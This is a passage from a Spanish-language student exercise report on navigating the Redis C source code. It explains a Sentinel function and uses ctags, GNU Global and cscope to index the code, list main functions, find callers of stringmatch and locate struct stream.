<h2 id="6-llamadas-a-funciones-externas"><strong>6. Llamadas a funciones externas</strong></h2>
<ul>
<li>
<p><code>dictGetIterator(d[j])</code> (línea 8)</p>
<ul>
<li>Usa el diccionario actual <code>(d[j])</code> y devuelve un iterador que se guarda en <code>di</code>.</li>
</ul>
</li>
<li>
<p><code>dictNext(di)</code> (línea 9)</p>
<ul>
<li>Avanza el iterador <code>di</code> y devuelve la siguiente entrada <code>(dictEntry *)</code> o <code>NULL</code> al terminar.</li>
</ul>
</li>
<li>
<p><code>dictGetVal(de)</code> (línea 10)</p>
<ul>
<li>Obtiene el valor asociado a la entrada de diccionario de. Ese valor se interpreta como <code>sentinelRedisInstance *</code>.</li>
</ul>
</li>
<li>
<p><code>dictReleaseIterator(di)</code> (línea 13)</p>
<ul>
<li>Libera los recursos asociados al iterador <code>di</code> al terminar de recorrer el diccionario.</li>
</ul>
</li>
</ul>
<p>Estas funciones operan sobre estructuras que viven fuera de la función y representan el estado del programa, diccionarios de instancias.</p>
<h2 id="7-puntos-de-salida-de-la-funci%C3%B3n"><strong>7. Puntos de salida de la función</strong></h2>
<ul>
<li>La función no contiene <code>return</code> explícitos.</li>
<li>Sólo tiene un único punto de salida implícito:
<ul>
<li>Al llegar a la llave de cierre <code>}</code> (línea 15), finaliza la ejecución.</li>
<li>No se devuelve ningún valor, es de tipo <code>void</code>.</li>
</ul>
</li>
</ul>
<h2 id="8-en-resumen"><strong>8. En resumen</strong></h2>
<ul>
<li>(1) Argumento: Tipo puntero a <code>sentinelRedisInstance</code> llamado <code>master</code>.</li>
<li>(2, 3, 4) Variables locales:
<ul>
<li><code>dictIterator *di</code></li>
<li><code>dictEntry *de</code></li>
<li><code>int j</code></li>
</ul>
</li>
<li>(5) Variable local compuesta: <code>array dict *d[]</code> inicializado con:
<ul>
<li><code>master-&gt;slaves</code></li>
<li><code>master-&gt;sentinels</code></li>
<li><code>NULL</code> como terminador</li>
</ul>
</li>
<li>(6) Dentro del <code>while</code>, variable local <code>sentinelRedisInstance *ri</code>.</li>
<li>(7) Estructura de repetición <code>for</code> que recorre los elementos del <code>array d</code> hasta <code>NULL</code>.</li>
<li>(8) Dentro del <code>for</code>, se crea un iterador de diccionario con <code>dictGetIterator</code>.</li>
<li>(9) Estructura de repetición <code>while</code> que recorre todas las entradas de cada diccionario.</li>
<li>(10) En cada iteración del <code>while</code>, se obtiene <code>ri</code> con <code>dictGetVal(de)</code> y se propaga:
<ul>
<li><code>ri-&gt;down_after_period = master-&gt;down_after_period;</code></li>
</ul>
</li>
<li>(11) Al salir del <code>while</code>, se libera el iterador con <code>dictReleaseIterator(di)</code>.</li>
<li>(12) La función termina al final del bloque <code>(})</code>, sin valor de retorno <code>(void)</code>.</li>
</ul>
<hr>
<div style="page-break-before: always;"></div>
<h1 id="ejercicio-4---bases-de-datos-simb%C3%B3licas"><strong>Ejercicio 4 - Bases de datos simbólicas</strong></h1>
<h2 id="1-pasos-para-crear-una-base-de-datos-simb%C3%B3lica-en-las-herramientas-elegidas"><strong>1. Pasos para crear una base de datos simbólica en las herramientas elegidas</strong></h2>
<h3 id="crear-una-bd-simb%C3%B3lica-con-ctags"><strong>Crear una BD simbólica con ctags</strong></h3>
<pre class="hljs"><code><div>sudo apt install exuberant-ctags
ctags -R --languages=C --exclude=.git --exclude=deps .
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>-R</code> → recorre subdirectorios.</li>
<li><code>--languages=C</code> → solo código C (Redis es C).</li>
<li><code>--exclude=...</code> → no indexar <code>.git</code> ni deps, código de terceros.</li>
<li><code>.</code> → directorio actual.</li>
</ul>
<p>Crea un archivo tags con todas las funciones, variables, etc.
<img src="capturas/tags-2.png" alt="tags"></p>
<h3 id="crear-una-bd-simb%C3%B3lica-con-global"><strong>Crear una BD simbólica con global</strong></h3>
<pre class="hljs"><code><div>sudo apt install global
gtags
</div></code></pre>
<p>donde:</p>
<ul>
<li>Recorre los <code>.c</code>, <code>.h</code>, etc.</li>
<li>Genera 3 archivos: <code>GTAGS</code>, <code>GRTAGS</code>, <code>GPATH</code>.
<img src="capturas/gtags.png" alt="gtags.png"></li>
</ul>
<p>Ver todas las referencias, es decir, los usos de una función <code>main</code>:</p>
<pre class="hljs"><code><div>global -rx main
</div></code></pre>
<p><img src="capturas/global-main.png" alt="global-main.png">
donde:</p>
<ul>
<li><code>-r</code> → significa <code>references</code>. Buscará todas las referencias/usos de <code>main</code> en el código (llamadas, apariciones, etc.), usando la base <code>GRTAGS</code>.</li>
<li><code>-x</code> → hace que la salida se muestre en formato <code>cross-reference</code>.</li>
</ul>
<h3 id="crear-una-bd-simb%C3%B3lica-con-cscope"><strong>Crear una BD simbólica con cscope</strong></h3>
<p>Instalamos cscope y generamos un fichero con todos los <code>.c</code> y <code>.h</code> del proyecto:</p>
<pre class="hljs"><code><div>sudo apt install cscope
find . -name '*.[ch]' &gt; cscope.files
</div></code></pre>
<p>Vemos el fichero <code>scope.files</code>:
<img src="capturas/head.scope-files.png" alt="head.scope-files.png"></p>
<p>Construimos la base de datos</p>
<pre class="hljs"><code><div>cscope -b -q -k -i cscope.files
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>-b</code> → sólo construye la base de datos, no abre la interfaz.</li>
<li><code>-q</code> → índice rápido (añade <code>cscope.in.out</code> y <code>cscope.po.out</code>).</li>
<li><code>-k</code> → ignora cabeceras del sistema (no mira /usr/include).</li>
<li><code>-i cscope.files</code> → usa la lista de archivos que acabamos de generar.
<img src="capturas/cscope-2.png" alt="cscope.png"></li>
</ul>
<p>Entramos en el menú interactivo y mostramos dónde se usa un símbolo <code>main</code>:</p>
<pre class="hljs"><code><div>cscope -d
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>-d</code> → usa la base existente, no la reconstruye.
<img src="capturas/cscope-main.png" alt="cscope-main.png"></li>
</ul>
<h2 id="2-busqueda-de-todas-las-funciones-main-que-existen"><strong>2. Busqueda de todas las funciones “main” que existen</strong></h2>
<p>Como sabrás, son las funciones principales de entrada a los distintos ejecutables que existen. Haz una captura o copia la lista resultante.</p>
<h3 id="buscar-funciones-main-con-global"><strong>Buscar funciones main con Global</strong></h3>
<p>Buscamos todas las definiciones de <code>main</code> y las guardamos en un fichero de texto:</p>
<pre class="hljs"><code><div>global -x main &gt; lista_main.txt
</div></code></pre>
<p>Resultado:</p>
<pre class="hljs"><code><div>main               43 deps/hiredis/examples/example-ae.c int main (int argc, char **argv) {
main               48 deps/hiredis/examples/example-glib.c main (gint argc     G_GNUC_UNUSED,
main               35 deps/hiredis/examples/example-ivykis.c int main (int argc, char **argv) {
main               35 deps/hiredis/examples/example-libev.c int main (int argc, char **argv) {
main               36 deps/hiredis/examples/example-libevent-ssl.c int main (int argc, char **argv) {
main               40 deps/hiredis/examples/example-libevent.c int main (int argc, char **argv) {
main               47 deps/hiredis/examples/example-libhv.c int main (int argc, char **argv) {
main               50 deps/hiredis/examples/example-libsdevent.c int main (int argc, char **argv) {
main               50 deps/hiredis/examples/example-libuv.c int main (int argc, char **argv) {
main               38 deps/hiredis/examples/example-macosx.c int main (int argc, char **argv) {
main               42 deps/hiredis/examples/example-poll.c int main (int argc, char **argv) {
main              106 deps/hiredis/examples/example-push.c int main(int argc, char **argv) {
main               36 deps/hiredis/examples/example-qt.cpp int main (int argc, char **argv) {
main               12 deps/hiredis/examples/example-ssl.c int main(int argc, char **argv) {
main               58 deps/hiredis/examples/example.c int main(int argc, char **argv) {
main             1289 deps/hiredis/sds.c int main(void) {
main             2266 deps/hiredis/test.c int main(int argc, char **argv) {
main                8 deps/jemalloc/msvc/test_threads/test_threads_main.cpp int main(int argc, char** argv) {
main               47 deps/jemalloc/test/analyze/prof_bias.c main(void) {
main              272 deps/jemalloc/test/analyze/rand.c main(void) {
main               32 deps/jemalloc/test/analyze/sizes.c main() {
main               63 deps/jemalloc/test/integration/MALLOCX_ARENA.c main(void) {
main              151 deps/jemalloc/test/integration/aligned_alloc.c main(void) {
main              116 deps/jemalloc/test/integration/allocated.c main(void) {
main               21 deps/jemalloc/test/integration/cpp/basic.cpp main() {
main               19 deps/jemalloc/test/integration/cpp/infallible_new_false.cpp main(void) {
main               63 deps/jemalloc/test/integration/cpp/infallible_new_true.cpp main(void) {
main              281 deps/jemalloc/test/integration/extent.c main(void) {
main               13 deps/jemalloc/test/integration/malloc.c main(void) {
main              267 deps/jemalloc/test/integration/mallocx.c main(void) {
main               56 deps/jemalloc/test/integration/overflow.c main(void) {
main              123 deps/jemalloc/test/integration/posix_memalign.c main(void) {
main              300 deps/jemalloc/test/integration/rallocx.c main(void) {
main               51 deps/jemalloc/test/integration/sdallocx.c main(void) {
main               77 deps/jemalloc/test/integration/slab_sizes.c main(void) {
main              305 deps/jemalloc/test/integration/smallocx.c main(void) {
main               83 deps/jemalloc/test/integration/thread_arena.c main(void) {
main               79 deps/jemalloc/test/integration/thread_tcache_enabled.c main(void) {
main              374 deps/jemalloc/test/integration/xallocx.c main(void) {
main              190 deps/jemalloc/test/stress/batch_alloc.c int main(void) {
main               72 deps/jemalloc/test/stress/fill_flush.c int main(void) {
main               66 deps/jemalloc/test/stress/hookbench.c main(void) {
main               29 deps/jemalloc/test/stress/large_microbench.c main(void) {
main               70 deps/jemalloc/test/stress/mallctl.c main(void) {
main              119 deps/jemalloc/test/stress/microbench.c main(void) {
main             1593 deps/jemalloc/test/unit/SFMT.c main(void) {
main               13 deps/jemalloc/test/unit/a0.c main(void) {
main              429 deps/jemalloc/test/unit/arena_decay.c main(void) {
main              355 deps/jemalloc/test/unit/arena_reset.c main(void) {
main              221 deps/jemalloc/test/unit/atomic.c main(void) {
main              113 deps/jemalloc/test/unit/background_thread.c main(void) {
main               92 deps/jemalloc/test/unit/background_thread_enable.c main(void) {
main              258 deps/jemalloc/test/unit/base.c main(void) {
main              182 deps/jemalloc/test/unit/batch_alloc.c main(void) {
main              149 deps/jemalloc/test/unit/binshard.c main(void) {
main              280 deps/jemalloc/test/unit/bit_util.c main(void) {
main              335 deps/jemalloc/test/unit/bitmap.c main(void) {
main              189 deps/jemalloc/test/unit/buf_writer.c main(void) {
main              381 deps/jemalloc/test/unit/cache_bin.c main(void) {
main              206 deps/jemalloc/test/unit/ckh.c main(void) {
main               76 deps/jemalloc/test/unit/counter.c main(void) {
main              274 deps/jemalloc/test/unit/decay.c main(void) {
main               26 deps/jemalloc/test/unit/div.c main(void) {
main               74 deps/jemalloc/test/unit/double_free.c main(void) {
main              220 deps/jemalloc/test/unit/edata_cache.c main(void) {
main              136 deps/jemalloc/test/unit/extent_quantize.c main(void) {
main              938 deps/jemalloc/test/unit/fb.c main(void) {
main              137 deps/jemalloc/test/unit/fork.c main(void) {
main              381 deps/jemalloc/test/unit/fxp.c main(void) {
main              168 deps/jemalloc/test/unit/hash.c main(void) {
main              574 deps/jemalloc/test/unit/hook.c main(void) {
main              441 deps/jemalloc/test/unit/hpa.c main(void) {
main              170 deps/jemalloc/test/unit/hpa_background_thread.c main(void) {
main              237 deps/jemalloc/test/unit/hpdata.c int main(void) {
main              103 deps/jemalloc/test/unit/huge.c main(void) {
main              274 deps/jemalloc/test/unit/inspect.c main(void) {
main              185 deps/jemalloc/test/unit/junk.c main(void) {
main              190 deps/jemalloc/test/unit/log.c main(void) {
main             1237 deps/jemalloc/test/unit/mallctl.c main(void) {
main               26 deps/jemalloc/test/unit/malloc_conf_2.c main(void) {
main              262 deps/jemalloc/test/unit/malloc_io.c main(void) {
main              382 deps/jemalloc/test/unit/math.c main(void) {
main              298 deps/jemalloc/test/unit/mpsc_queue.c main(void) {
main               84 deps/jemalloc/test/unit/mq.c main(void) {
main               53 deps/jemalloc/test/unit/mtx.c main(void) {
main              237 deps/jemalloc/test/unit/nstime.c main(void) {
main              128 deps/jemalloc/test/unit/oversize_threshold.c main(void) {
main              123 deps/jemalloc/test/unit/pa.c main(void) {
main              163 deps/jemalloc/test/unit/pack.c main(void) {
main               26 deps/jemalloc/test/unit/pages.c main(void) {
main               44 deps/jemalloc/test/unit/peak.c main(void) {
main              326 deps/jemalloc/test/unit/ph.c main(void) {
main              181 deps/jemalloc/test/unit/prng.c main(void) {
main               81 deps/jemalloc/test/unit/prof_accum.c main(void) {
main              116 deps/jemalloc/test/unit/prof_active.c main(void) {
main               74 deps/jemalloc/test/unit/prof_gdump.c main(void) {
main              164 deps/jemalloc/test/unit/prof_hook.c main(void) {
main               54 deps/jemalloc/test/unit/prof_idump.c main(void) {
main              143 deps/jemalloc/test/unit/prof_log.c main(void) {
main              211 deps/jemalloc/test/unit/prof_mdump.c main(void) {
main              670 deps/jemalloc/test/unit/prof_recent.c main(void) {
main              257 deps/jemalloc/test/unit/prof_reset.c main(void) {
main              147 deps/jemalloc/test/unit/prof_stats.c main(void) {
main               74 deps/jemalloc/test/unit/prof_sys_thread_name.c main(void) {
main               45 deps/jemalloc/test/unit/prof_tctx.c main(void) {
main              118 deps/jemalloc/test/unit/prof_thread_name.c main(void) {
main              735 deps/jemalloc/test/unit/psset.c main(void) {
main              306 deps/jemalloc/test/unit/ql.c main(void) {
main              236 deps/jemalloc/test/unit/qr.c main(void) {
main             1012 deps/jemalloc/test/unit/rb.c main(void) {
main              185 deps/jemalloc/test/unit/retained.c main(void) {
main              282 deps/jemalloc/test/unit/rtree.c main(void) {
main              153 deps/jemalloc/test/unit/safety_check.c main(void) {
main              202 deps/jemalloc/test/unit/san.c main(void) {
main              107 deps/jemalloc/test/unit/san_bump.c main(void) {
main               30 deps/jemalloc/test/unit/sc.c main(void) {
main              622 deps/jemalloc/test/unit/sec.c main(void) {
main               91 deps/jemalloc/test/unit/seq.c int main(void) {
main               74 deps/jemalloc/test/unit/size_check.c main(void) {
main              183 deps/jemalloc/test/unit/size_classes.c main(void) {
main               36 deps/jemalloc/test/unit/slab.c main(void) {
main               97 deps/jemalloc/test/unit/smoothstep.c main(void) {
main               15 deps/jemalloc/test/unit/spin.c main(void) {
main              420 deps/jemalloc/test/unit/stats.c main(void) {
main              995 deps/jemalloc/test/unit/stats_print.c main(void) {
main               64 deps/jemalloc/test/unit/sz.c main(void) {
main              173 deps/jemalloc/test/unit/tcache_max.c main(void) {
main               34 deps/jemalloc/test/unit/test_hooks.c main(void) {
main               31 deps/jemalloc/test/unit/thread_event.c main(void) {
main               94 deps/jemalloc/test/unit/ticker.c main(void) {
main              262 deps/jemalloc/test/unit/tsd.c main(void) {
main              257 deps/jemalloc/test/unit/uaf.c main(void) {
main              272 deps/jemalloc/test/unit/witness.c main(void) {
main               55 deps/jemalloc/test/unit/zero.c main(void) {
main               22 deps/jemalloc/test/unit/zero_realloc_abort.c main(void) {
main               45 deps/jemalloc/test/unit/zero_realloc_alloc.c main(void) {
main               30 deps/jemalloc/test/unit/zero_realloc_free.c main(void) {
main               33 deps/jemalloc/test/unit/zero_reallocs.c main(void) {
main               23 deps/linenoise/example.c int main(int argc, char **argv) {
main               32 deps/lua/etc/min.c int main(void)
main              377 deps/lua/src/lua.c int main (int argc, char **argv) {
main              186 deps/lua/src/luac.c int main(int argc, char* argv[])
main              927 modules/vector-sets/expr.c int main(int argc, char **argv) {
main              485 modules/vector-sets/w2v.c int main(int argc, char **argv) {
main               89 src/localtime.c  int main(void) {
main              170 src/mt19937-64.c int main(void)
main             1696 src/redis-benchmark.c int main(int argc, char **argv) {
main             10616 src/redis-cli.c  int main(int argc, char **argv) {
main             7462 src/server.c     int main(int argc, char **argv) {
main              323 src/setproctitle.c int main(int argc, char *argv[]) {
main              363 src/siphash.c    int main(void) {
main               18 utils/corrupt_rdb.c int main(int argc, char **argv) {
main               83 utils/lru/lfu-simulation.c int main(void) {
main               75 utils/tracking_collisions.c int main(void) {
</div></code></pre>
<h3 id="buscar-funciones-main-con-cscope"><strong>Buscar funciones main con Cscope</strong></h3>
<p>Usamos cscope en modo <code>no interactivo</code> para buscar la definición global de <code>main</code>:</p>
<pre class="hljs"><code><div>cscope -d -L1 main &gt; lista_main_cscope.txt
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>-d</code> → usa la base existente, no la reconstruye.</li>
<li><code>-L1</code> → búsqueda tipo <code>Find this global definition</code> para el símbolo <code>main</code>.</li>
<li>Redirigimos a <code>lista_main_cscope.txt</code>.</li>
</ul>
<div style="page-break-before: always;"></div>
<p>Vemos el resultado:</p>
<pre class="hljs"><code><div>deps/hiredis/examples/example-ae.c main 43 int main (int argc, char **argv) {
deps/hiredis/examples/example-glib.c main 48 main (gint argc G_GNUC_UNUSED,
deps/hiredis/examples/example-ivykis.c main 35 int main (int argc, char **argv) {
deps/hiredis/examples/example-libev.c main 35 int main (int argc, char **argv) {
deps/hiredis/examples/example-libevent-ssl.c main 36 int main (int argc, char **argv) {
deps/hiredis/examples/example-libevent.c main 40 int main (int argc, char **argv) {
deps/hiredis/examples/example-libhv.c main 47 int main (int argc, char **argv) {
deps/hiredis/examples/example-libsdevent.c main 50 int main (int argc, char **argv) {
deps/hiredis/examples/example-libuv.c main 50 int main (int argc, char **argv) {
deps/hiredis/examples/example-macosx.c main 38 int main (int argc, char **argv) {
deps/hiredis/examples/example-poll.c main 42 int main (int argc, char **argv) {
deps/hiredis/examples/example-push.c main 106 int main(int argc, char **argv) {
deps/hiredis/examples/example-ssl.c main 12 int main(int argc, char **argv) {
deps/hiredis/examples/example.c main 58 int main(int argc, char **argv) {
deps/hiredis/sds.c main 1289 int main(void ) {
deps/hiredis/test.c main 2266 int main(int argc, char **argv) {
deps/jemalloc/test/analyze/prof_bias.c main 47 main(void ) {
deps/jemalloc/test/analyze/rand.c main 272 main(void ) {
deps/jemalloc/test/analyze/sizes.c main 32 main() {
deps/jemalloc/test/integration/MALLOCX_ARENA.c main 63 main(void ) {
deps/jemalloc/test/integration/aligned_alloc.c main 151 main(void ) {
deps/jemalloc/test/integration/allocated.c main 116 main(void ) {
deps/jemalloc/test/integration/extent.c main 281 main(void ) {
deps/jemalloc/test/integration/malloc.c main 13 main(void ) {
deps/jemalloc/test/integration/mallocx.c main 267 main(void ) {
deps/jemalloc/test/integration/overflow.c main 56 main(void ) {
deps/jemalloc/test/integration/posix_memalign.c main 123 main(void ) {
deps/jemalloc/test/integration/rallocx.c main 300 main(void ) {
deps/jemalloc/test/integration/sdallocx.c main 51 main(void ) {
deps/jemalloc/test/integration/slab_sizes.c main 77 main(void ) {
deps/jemalloc/test/integration/smallocx.c main 305 main(void ) {
deps/jemalloc/test/integration/thread_arena.c main 83 main(void ) {
deps/jemalloc/test/integration/thread_tcache_enabled.c main 79 main(void ) {
deps/jemalloc/test/integration/xallocx.c main 374 main(void ) {
deps/jemalloc/test/stress/batch_alloc.c main 190 int main(void ) {
deps/jemalloc/test/stress/fill_flush.c main 72 int main(void ) {
deps/jemalloc/test/stress/hookbench.c main 66 main(void ) {
deps/jemalloc/test/stress/large_microbench.c main 29 main(void ) {
deps/jemalloc/test/stress/mallctl.c main 70 main(void ) {
deps/jemalloc/test/stress/microbench.c main 119 main(void ) {
deps/jemalloc/test/unit/SFMT.c main 1593 main(void ) {
deps/jemalloc/test/unit/a0.c main 13 main(void ) {
deps/jemalloc/test/unit/arena_decay.c main 429 main(void ) {
deps/jemalloc/test/unit/arena_reset.c main 355 main(void ) {
deps/jemalloc/test/unit/atomic.c main 221 main(void ) {
deps/jemalloc/test/unit/background_thread.c main 113 main(void ) {
deps/jemalloc/test/unit/background_thread_enable.c main 92 main(void ) {
deps/jemalloc/test/unit/base.c main 258 main(void ) {
deps/jemalloc/test/unit/batch_alloc.c main 182 main(void ) {
deps/jemalloc/test/unit/binshard.c main 149 main(void ) {
deps/jemalloc/test/unit/bit_util.c main 280 main(void ) {
deps/jemalloc/test/unit/bitmap.c main 335 main(void ) {
deps/jemalloc/test/unit/buf_writer.c main 189 main(void ) {
deps/jemalloc/test/unit/cache_bin.c main 381 main(void ) {
deps/jemalloc/test/unit/ckh.c main 206 main(void ) {
deps/jemalloc/test/unit/counter.c main 76 main(void ) {
deps/jemalloc/test/unit/decay.c main 274 main(void ) {
deps/jemalloc/test/unit/div.c main 26 main(void ) {
deps/jemalloc/test/unit/double_free.c main 74 main(void ) {
deps/jemalloc/test/unit/edata_cache.c main 220 main(void ) {
deps/jemalloc/test/unit/emitter.c main 523 main(void ) {
deps/jemalloc/test/unit/extent_quantize.c main 136 main(void ) {
deps/jemalloc/test/unit/fb.c main 938 main(void ) {
deps/jemalloc/test/unit/fork.c main 137 main(void ) {
deps/jemalloc/test/unit/fxp.c main 381 main(void ) {
deps/jemalloc/test/unit/hash.c main 168 main(void ) {
deps/jemalloc/test/unit/hook.c main 574 main(void ) {
deps/jemalloc/test/unit/hpa.c main 441 main(void ) {
deps/jemalloc/test/unit/hpa_background_thread.c main 170 main(void ) {
deps/jemalloc/test/unit/hpdata.c main 237 int main(void ) {
deps/jemalloc/test/unit/huge.c main 103 main(void ) {
deps/jemalloc/test/unit/inspect.c main 274 main(void ) {
deps/jemalloc/test/unit/junk.c main 185 main(void ) {
deps/jemalloc/test/unit/log.c main 190 main(void ) {
deps/jemalloc/test/unit/mallctl.c main 1237 main(void ) {
deps/jemalloc/test/unit/malloc_conf_2.c main 26 main(void ) {
deps/jemalloc/test/unit/malloc_io.c main 262 main(void ) {
deps/jemalloc/test/unit/math.c main 382 main(void ) {
deps/jemalloc/test/unit/mpsc_queue.c main 298 main(void ) {
deps/jemalloc/test/unit/mq.c main 84 main(void ) {
deps/jemalloc/test/unit/mtx.c main 53 main(void ) {
deps/jemalloc/test/unit/nstime.c main 237 main(void ) {
deps/jemalloc/test/unit/oversize_threshold.c main 128 main(void ) {
deps/jemalloc/test/unit/pa.c main 123 main(void ) {
deps/jemalloc/test/unit/pack.c main 163 main(void ) {
deps/jemalloc/test/unit/pages.c main 26 main(void ) {
deps/jemalloc/test/unit/peak.c main 44 main(void ) {
deps/jemalloc/test/unit/ph.c main 326 main(void ) {
deps/jemalloc/test/unit/prng.c main 181 main(void ) {
deps/jemalloc/test/unit/prof_accum.c main 81 main(void ) {
deps/jemalloc/test/unit/prof_active.c main 116 main(void ) {
deps/jemalloc/test/unit/prof_gdump.c main 74 main(void ) {
deps/jemalloc/test/unit/prof_hook.c main 164 main(void ) {
deps/jemalloc/test/unit/prof_idump.c main 54 main(void ) {
deps/jemalloc/test/unit/prof_log.c main 143 main(void ) {
deps/jemalloc/test/unit/prof_mdump.c main 211 main(void ) {
deps/jemalloc/test/unit/prof_recent.c main 670 main(void ) {
deps/jemalloc/test/unit/prof_reset.c main 257 main(void ) {
deps/jemalloc/test/unit/prof_stats.c main 147 main(void ) {
deps/jemalloc/test/unit/prof_sys_thread_name.c main 74 main(void ) {
deps/jemalloc/test/unit/prof_tctx.c main 45 main(void ) {
deps/jemalloc/test/unit/prof_thread_name.c main 118 main(void ) {
deps/jemalloc/test/unit/psset.c main 735 main(void ) {
deps/jemalloc/test/unit/ql.c main 306 main(void ) {
deps/jemalloc/test/unit/qr.c main 236 main(void ) {
deps/jemalloc/test/unit/rb.c main 1012 main(void ) {
deps/jemalloc/test/unit/retained.c main 185 main(void ) {
deps/jemalloc/test/unit/rtree.c main 282 main(void ) {
deps/jemalloc/test/unit/safety_check.c main 153 main(void ) {
deps/jemalloc/test/unit/san.c main 202 main(void ) {
deps/jemalloc/test/unit/san_bump.c main 107 main(void ) {
deps/jemalloc/test/unit/sc.c main 30 main(void ) {
deps/jemalloc/test/unit/sec.c main 622 main(void ) {
deps/jemalloc/test/unit/seq.c main 91 int main(void ) {
deps/jemalloc/test/unit/size_check.c main 74 main(void ) {
deps/jemalloc/test/unit/size_classes.c main 183 main(void ) {
deps/jemalloc/test/unit/slab.c main 36 main(void ) {
deps/jemalloc/test/unit/smoothstep.c main 97 main(void ) {
deps/jemalloc/test/unit/spin.c main 15 main(void ) {
deps/jemalloc/test/unit/stats.c main 420 main(void ) {
deps/jemalloc/test/unit/stats_print.c main 995 main(void ) {
deps/jemalloc/test/unit/sz.c main 64 main(void ) {
deps/jemalloc/test/unit/tcache_max.c main 173 main(void ) {
deps/jemalloc/test/unit/test_hooks.c main 34 main(void ) {
deps/jemalloc/test/unit/thread_event.c main 31 main(void ) {
deps/jemalloc/test/unit/ticker.c main 94 main(void ) {
deps/jemalloc/test/unit/tsd.c main 262 main(void ) {
deps/jemalloc/test/unit/uaf.c main 257 main(void ) {
deps/jemalloc/test/unit/witness.c main 272 main(void ) {
deps/jemalloc/test/unit/zero.c main 55 main(void ) {
deps/jemalloc/test/unit/zero_realloc_abort.c main 22 main(void ) {
deps/jemalloc/test/unit/zero_realloc_alloc.c main 45 main(void ) {
deps/jemalloc/test/unit/zero_realloc_free.c main 30 main(void ) {
deps/jemalloc/test/unit/zero_reallocs.c main 33 main(void ) {
deps/linenoise/example.c main 23 int main(int argc, char **argv) {
deps/lua/etc/min.c main 32 int main(void )
deps/lua/src/lua.c main 377 int main (int argc, char **argv) {
deps/lua/src/luac.c main 186 int main(int argc, char * argv[])
modules/vector-sets/expr.c main 927 int main(int argc, char **argv) {
modules/vector-sets/w2v.c main 485 int main(int argc, char **argv) {
src/localtime.c main 89 int main(void ) {
src/mt19937-64.c main 170 int main(void )
src/redis-benchmark.c main 1696 int main(int argc, char **argv) {
src/redis-cli.c main 10616 int main(int argc, char **argv) {
src/server.c main 7462 int main(int argc, char **argv) {
src/setproctitle.c main 323 int main(int argc, char *argv[]) {
src/siphash.c main 363 int main(void ) {
utils/corrupt_rdb.c main 18 int main(int argc, char **argv) {
utils/lru/lfu-simulation.c main 83 int main(void ) {
utils/tracking_collisions.c main 75 int main(void ) {
</div></code></pre>
<h2 id="3-b%C3%BAsqueda-de-las-funciones-que-llaman-a-la-funci%C3%B3n-stringmatch"><strong>3. Búsqueda de las funciones que llaman a la función stringmatch</strong></h2>
<h3 id="buscar-funciones-que-llaman-a-stringmatch-con-global"><strong>Buscar funciones que llaman a stringmatch con Global</strong></h3>
<p>Buscamos todas las referencias a <code>stringmatch</code>:</p>
<pre class="hljs"><code><div>global -rx stringmatch
</div></code></pre>
<p><img src="capturas/global-stringmatch.png" alt="global-stringmatch.png"></p>
<h3 id="buscar-funciones-que-llaman-a-stringmatch-con-scope"><strong>Buscar funciones que llaman a stringmatch con Scope</strong></h3>
<pre class="hljs"><code><div>cd redis
find . -name '*.[ch]' &gt; cscope.files         # solo si no tenemos la Base de Datos
cscope -b -q -k -i cscope.files              # solo una vez

cscope -d -L3 stringmatch &gt; referencias_stringmatch.txt
cat callers_stringmatch.txt                  # copiar o capturar
</div></code></pre>
<p>donde:</p>
<ul>
<li><code>-d</code> → Para que use la base de datos, no la reconstruye.</li>
<li><code>-L3</code> → “functions calling this function” (la opción 3 del menú interactivo).</li>
<li><code>stringmatch</code> → el símbolo a buscar.</li>
</ul>
<pre class="hljs"><code><div>src/config.c configGetCommand 978 if (stringmatch(name, dictGetKey(de), 1)) {
src/config.c moduleConfigIteratorNext 3517 if (!pattern || stringmatch(pattern, config-&gt;name, 1))
src/sentinel.c sentinelResetMastersByPattern 1561 if (stringmatch(pattern,ri-&gt;name,0)) {
src/sentinel.c sentinelConfigGetCommand 3322 if (stringmatch(pattern,&quot;resolve-hostnames&quot;,1) &amp;&amp; !dictFind(d, &quot;resolve-hostnames&quot;)) {
src/sentinel.c sentinelConfigGetCommand 3328 if (stringmatch(pattern, &quot;announce-hostnames&quot;, 1) &amp;&amp; !dictFind(d, &quot;announce-hostnames&quot;)) {
src/sentinel.c sentinelConfigGetCommand 3334 if (stringmatch(pattern, &quot;announce-ip&quot;, 1) &amp;&amp; !dictFind(d, &quot;announce-ip&quot;)) {
src/sentinel.c sentinelConfigGetCommand 3340 if (stringmatch(pattern, &quot;announce-port&quot;, 1) &amp;&amp; !dictFind(d, &quot;announce-port&quot;)) {
src/sentinel.c sentinelConfigGetCommand 3346 if (stringmatch(pattern, &quot;sentinel-user&quot;, 1) &amp;&amp; !dictFind(d, &quot;sentinel-user&quot;)) {
src/sentinel.c sentinelConfigGetCommand 3352 if (stringmatch(pattern, &quot;sentinel-pass&quot;, 1) &amp;&amp; !dictFind(d, &quot;sentinel-pass&quot;)) {
src/sentinel.c sentinelConfigGetCommand 3358 if (stringmatch(pattern, &quot;loglevel&quot;, 1) &amp;&amp; !dictFind(d, &quot;loglevel&quot;)) {
</div></code></pre>
<h2 id="4-b%C3%BAsqueda-de-la-declaraci%C3%B3n-de-struct-stream"><strong>4. Búsqueda de la declaración de struct stream</strong></h2>
<p>Tanto el archivo donde está, como la línea donde comienza. Debéis hacerlo usando las herramientas, no vale con mostrar su localización, debéis mostrar como se localiza.</p>
<h3 id="la-declaraci%C3%B3n-de-struct-stream-en-el-c%C3%B3digo"><strong>La declaración de struct stream en el código</strong></h3>
<p>En C, un <code>struct</code> es una estructura de datos: un tipo que agrupa varias variables bajo un mismo nombre. En Redis existe un tipo de datos complejo llamado <code>struct stream</code>, que guarda toda la información relacionada con un <code>stream</code> (una estructura interna de Redis).</p>
<p>Tenemos que buscar el sitio del código donde se define esa estructura. Aparecerá algo de este estilo:</p>
<pre class="hljs"><code><div>typedef struct stream {
    /* campos... */
} stream;

/* o algo parecido a: */

struct stream {
    /* campos... */
};
</div></code></pre>
<h3 id="buscar-declaraci%C3%B3n-struct-stream-con-global"><strong>Buscar declaración struct stream con Global</strong></h3>
<pre class="hljs"><code><div>global -x stream
</div></code></pre>
<p><img src="capturas/struct-stream.png" alt="struct-stream.png">
donde:</p>
<ul>
<li>Busca definiciones del símbolo <code>stream</code> en la base de datos <code>GTAGS</code>.</li>
<li><code>-x</code> → Las imprime en formato tipo <code>cross-reference</code>.</li>
<li>Devuelve dos líneas:
<ul>
<li>Línea 16 (el primer resultado) → Corresponde donde se está declarando el <code>struct stream</code>.</li>
